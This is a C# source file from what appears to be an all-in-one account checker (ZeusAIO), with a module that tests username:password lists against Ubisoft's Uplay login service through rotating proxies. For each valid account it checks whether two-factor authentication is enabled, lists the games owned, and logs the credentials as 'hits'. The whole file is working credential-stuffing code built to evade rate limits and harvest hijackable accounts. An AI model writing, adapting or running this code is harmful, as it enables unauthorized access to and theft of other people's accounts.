using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;

namespace Uplay
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = false;
                            httpRequest.AddHeader("Authorization", "Basic " + Check.Base64Encode(s[0] + ":" + s[1]));
                            httpRequest.AddHeader("Ubi-AppId", "f68a4bb5-608a-4ff2-8123-be8ef797e0a6");
                            httpRequest.AddHeader("Ubi-RequestedPlatformType", "uplay");
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string text2 = httpRequest.Post("https://public-ubiservices.ubi.com/v3/profiles/sessions", "{}", "application/json; charset=utf-8").ToString();
                            bool flag7 = text2.Contains("profileId");

                            if (flag7)
                            {
                                JObject jsonObj = (JObject)JsonConvert.DeserializeObject(text2);

                                string sessionId = jsonObj["sessionId"].ToString();
                                string ticket = jsonObj["ticket"].ToString();

                                string has2fa = UPlayHas2FA(ticket, sessionId);

                                string games = UPlayGetGames(ticket);


                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - UPLAY] " + s[0] + ":" + s[1] + $" | HAS 2FA: {has2fa} - GAMES: {games}", Color.Green);
                                }
                                Export.AsResult("/Uplay_hits", s[0] + ":" + s[1] + $" | HAS 2FA: {has2fa} - GAMES: {games}");
                                return false;
                            }
                            else
                            {
                                bool flag8 = text2.Contains("Invalid credentials");
                                if (flag8)
                                {
                                    // Bad
                                    break;
                                }
                                else if (text2.Contains("The Ubi-Challenge header is required."))
                                {
                                    break;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                            }

                        }
                        //break;
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }


        static string UPlayHas2FA(string ticket, string sessionId)
        {
            while (true)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Ubi-SessionId", sessionId);
                        req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
                        req.Authorization = "Ubi_v1 t=" + ticket;

                        string strResponse = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
                        if (strResponse.Contains("active"))
                        {
                            if (strResponse.Contains("true"))
                            {
                                return "true";
                            }
                            else if (strResponse.Contains("false"))
                            {
                                return "false";
                            }
                        }
                    }
                }
                catch
                {
                    ZeusAIO.mainmenu.errors++;
                }
            }
            return "?";
        }
        static string UPlayGetGames(string ticket)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
                        req.Authorization = "Ubi_v1 t=" + ticket;

                        string strResponse = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
                        if (strResponse.Contains("[") && strResponse != "[]")
                        {
                            Match games = Regex.Match(strResponse, "\"slug\":\"(.*?)\"");
                            Match platforms = Regex.Match(strResponse, "\"platform\":\"(.*?)\"");

                            string result = "";

                            while (true)
                            {
                                result += "[" + games.Groups[1].Value + " - " + platforms.Groups[1].Value + "]";

                                games = games.NextMatch();
                                platforms = platforms.NextMatch();

                                if (games.Groups[1].Value == "")
                                    break;
                                else
                                    result += ", ";
                            }

                            return result;
                        }
                    }
                }
                catch
                {
                    //ZeusAIO.mainmenu.errors++;
                }
            return "";
        }

        static void SetBasicRequestSettingsAndProxies(HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 10000;
            req.KeepAliveTimeout = 10000;
            req.ReadWriteTimeout = 10000;

            {
                string[] proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount)).Split(':');
                ProxyClient proxyClient = ZeusAIO.mainmenu.proxyProtocol == "SOCKS5" ? new Socks5ProxyClient(proxy[0], int.Parse(proxy[1])) : ZeusAIO.mainmenu.proxyProtocol == "SOCKS4" ? new Socks4ProxyClient(proxy[0], int.Parse(proxy[1])) : (ProxyClient)new HttpProxyClient(proxy[0], int.Parse(proxy[1]));
                if (proxy.Length == 4)
                {
                    proxyClient.Username = proxy[2];
                    proxyClient.Password = proxy[3];
                }
                req.Proxy = proxyClient;
            }
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}
